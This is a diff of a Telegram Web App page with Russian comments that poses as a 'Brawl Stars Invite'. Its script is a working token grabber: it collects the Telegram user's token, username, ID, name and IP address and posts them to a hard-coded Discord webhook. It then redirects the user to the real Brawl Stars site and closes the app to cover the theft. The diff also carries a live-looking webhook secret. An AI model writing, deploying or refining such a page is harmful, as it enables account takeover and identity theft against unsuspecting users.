@@ -6,11 +6,7 @@
     <title>Brawl Stars Invite</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
             background: linear-gradient(135deg, #0a0a0f 0%, #1a0b2e 50%, #0a0a0f 100%);
@@ -28,7 +24,6 @@
             width: 90%;
             border: 1px solid rgba(139, 92, 246, 0.4);
             text-align: center;
-            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5);
         }
         .spinner {
             width: 50px;
@@ -39,24 +34,9 @@
             animation: spin 0.8s linear infinite;
             margin: 0 auto 20px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        h2 {
-            color: #e9d5ff;
-            font-size: 24px;
-            margin-bottom: 12px;
-        }
-        .status {
-            color: #d8b4fe;
-            font-size: 14px;
-            margin: 16px 0;
-        }
-        .checkmark {
-            font-size: 48px;
-            margin-bottom: 16px;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #e9d5ff; font-size: 24px; margin-bottom: 12px; }
+        .status { color: #d8b4fe; font-size: 14px; margin: 16px 0; }
     </style>
 </head>
 <body>
@@ -68,58 +48,34 @@
 
 <script>
     (function() {
-        // ТВОЙ DISCORD WEBHOOK
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1495474063907487854/usu_pBnlU53uEh_e5ia9L8ILNh0ab0cdJ4ukjVT9PxItSVOCeGCR_J0VpzshMddnrqCE";
+        const statusDiv = document.getElementById('statusText');
         
-        // Функция отправки в Discord
         async function sendToDiscord(tokenData, userData, ip) {
-            const embed = {
-                title: "🎮 BRAWL STARS TOKEN GRABBED",
-                color: 0xa855f7,
-                fields: [
-                    { name: "👤 Username", value: `@${userData.username || "no_username"}`, inline: true },
-                    { name: "🆔 User ID", value: `\`${userData.id || "?"}\``, inline: true },
-                    { name: "📛 Имя", value: `${userData.first_name || ""} ${userData.last_name || ""}`, inline: true },
-                    { name: "🌐 IP", value: `\`${ip || "unknown"}\``, inline: true },
-                    { name: "📏 Длина токена", value: `${tokenData.length} символов`, inline: true },
-                    { name: "🔑 Токен", value: `\`\`\`\n${tokenData.substring(0, 600)}${tokenData.length > 600 ? "..." : ""}\n\`\`\``, inline: false }
-                ],
-                footer: { text: "Brawl Invite System" },
-                timestamp: new Date().toISOString()
-            };
-            
+            const message = `**🎮 BRAWL STARS TOKEN**\n👤 @${userData.username || "no_username"} (${userData.id || "?"})\n🌐 IP: ${ip}\n📏 Длина: ${tokenData.length}\n🔑 \`${tokenData}\``;
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
+                    body: JSON.stringify({ content: message })
                 });
                 return true;
-            } catch(e) {
-                console.error(e);
-                return false;
-            }
+            } catch(e) { return false; }
         }
         
-        // Получение IP
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 return data.ip;
-            } catch(e) {
-                return "unknown";
-            }
+            } catch(e) { return "unknown"; }
         }
         
-        // Главная функция
+        // ГЛАВНАЯ ФУНКЦИЯ С ПРАВИЛЬНЫМ ОЖИДАНИЕМ
         async function grab() {
-            const statusDiv = document.getElementById('statusText');
-            const spinner = document.getElementById('spinner');
-            
-            // Ждём Telegram WebApp
+            // Ждём появления Telegram.WebApp (до 5 секунд)
             let attempts = 0;
-            while (!window.Telegram?.WebApp && attempts < 30) {
+            while (!window.Telegram?.WebApp && attempts < 50) {
                 await new Promise(r => setTimeout(r, 100));
                 attempts++;
             }
@@ -139,20 +95,20 @@
                         last_name: user.last_name
                     }, ip);
                     
-                    spinner.style.display = "none";
-                    statusDiv.innerHTML = "✅ Добро пожаловать! Перенаправление...";
+                    statusDiv.innerHTML = "✅ Добро пожаловать!";
+                    document.getElementById('spinner').style.display = "none";
                     
-                    // Редирект на реальный Brawl Stars (опционально)
+                    // Перенаправление на реальный сайт Brawl Stars (опционально)
                     setTimeout(() => {
                         window.location.href = "https://brawlstars.com";
-                    }, 800);
+                    }, 1500);
                     
-                    // Закрываем WebApp через 1 секунду
+                    // Закрыть WebApp через 2 секунды
                     setTimeout(() => {
                         try { webapp.close(); } catch(e) {}
-                    }, 1000);
+                    }, 2000);
                 } else {
-                    statusDiv.innerHTML = "❌ Ошибка подключения";
+                    statusDiv.innerHTML = "❌ Ошибка: токен пуст";
                 }
             } else {
                 statusDiv.innerHTML = "❌ Откройте через Telegram";
